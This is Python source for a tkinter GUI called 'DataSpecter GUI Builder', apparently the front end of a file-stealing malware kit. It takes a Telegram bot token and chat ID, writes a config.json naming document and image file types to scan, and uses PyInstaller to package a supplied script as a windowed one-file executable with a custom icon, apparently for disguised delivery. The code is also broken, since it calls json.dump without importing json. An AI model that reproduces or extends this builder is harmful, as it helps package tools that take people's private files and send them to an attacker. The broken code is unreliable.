import tkinter as tk
from tkinter import filedialog, messagebox
import os
import subprocess

class GUIBuilder:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("DataSpecter GUI Builder")

        # Create input fields
        self.input_frame = tk.Frame(self.root)
        self.input_frame.pack(padx=10, pady=10)

        tk.Label(self.input_frame, text="Script File:").grid(row=0, column=0, padx=5, pady=5)
        self.script_file_entry = tk.Entry(self.input_frame, width=50)
        self.script_file_entry.grid(row=0, column=1, padx=5, pady=5)

        tk.Label(self.input_frame, text="Icon File:").grid(row=1, column=0, padx=5, pady=5)
        self.icon_file_entry = tk.Entry(self.input_frame, width=50)
        self.icon_file_entry.grid(row=1, column=1, padx=5, pady=5)

        tk.Label(self.input_frame, text="Output Directory:").grid(row=2, column=0, padx=5, pady=5)
        self.output_dir_entry = tk.Entry(self.input_frame, width=50)
        self.output_dir_entry.grid(row=2, column=1, padx=5, pady=5)

        tk.Label(self.input_frame, text="Telegram Bot Token:").grid(row=3, column=0, padx=5, pady=5)
        self.telegram_bot_token_entry = tk.Entry(self.input_frame, width=50, show="*")
        self.telegram_bot_token_entry.grid(row=3, column=1, padx=5, pady=5)

        tk.Label(self.input_frame, text="Telegram Chat ID:").grid(row=4, column=0, padx=5, pady=5)
        self.telegram_chat_id_entry = tk.Entry(self.input_frame, width=50)
        self.telegram_chat_id_entry.grid(row=4, column=1, padx=5, pady=5)

        # Create buttons
        self.button_frame = tk.Frame(self.root)
        self.button_frame.pack(padx=10, pady=10)

        tk.Button(self.button_frame, text="Browse Script File", command=self.browse_script_file).pack(side=tk.LEFT, padx=5)
        tk.Button(self.button_frame, text="Browse Icon File", command=self.browse_icon_file).pack(side=tk.LEFT, padx=5)
        tk.Button(self.button_frame, text="Browse Output Directory", command=self.browse_output_dir).pack(side=tk.LEFT, padx=5)
        tk.Button(self.button_frame, text="Build", command=self.build).pack(side=tk.LEFT, padx=5)

    def browse_script_file(self):
        file_path = filedialog.askopenfilename(title="Select Script File", filetypes=[("Python Files", "*.py")])
        self.script_file_entry.delete(0, tk.END)
        self.script_file_entry.insert(0, file_path)

    def browse_icon_file(self):
        file_path = filedialog.askopenfilename(title="Select Icon File", filetypes=[("Icon Files", "*.ico")])
        self.icon_file_entry.delete(0, tk.END)
        self.icon_file_entry.insert(0, file_path)

    def browse_output_dir(self):
        dir_path = filedialog.askdirectory(title="Select Output Directory")
        self.output_dir_entry.delete(0, tk.END)
        self.output_dir_entry.insert(0, dir_path)

    def build(self):
        script_file = self.script_file_entry.get()
        icon_file = self.icon_file_entry.get()
        output_dir = self.output_dir_entry.get()
        telegram_bot_token = self.telegram_bot_token_entry.get()
        telegram_chat_id = self.telegram_chat_id_entry.get()

        if not script_file or not icon_file or not output_dir or not telegram_bot_token or not telegram_chat_id:
            messagebox.showerror("Error", "Please fill in all fields")
            return

        try:
            with open("config.json", "w") as f:
                json.dump({
                    "ScanFiles": [".txt", ".docx", ".pdf", ".jpg", ".png"],
                    "TelegramBotToken": telegram_bot_token,
                    "TelegramChatID": telegram_chat_id
                }, f)

            subprocess.run([
                "pyinstaller",
                "--onefile",
                "--windowed",
                f"--icon={icon_file}",
                f"--name=DataSpecter",
                f"--distpath={output_dir}",
                script_file
            ], check=True)
            messagebox.showinfo("Success", "Build successful")
        except subprocess.CalledProcessError as e:
            messagebox.showerror("Error", f"Build failed: {e}")

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    builder = GUIBuilder()
    builder.run()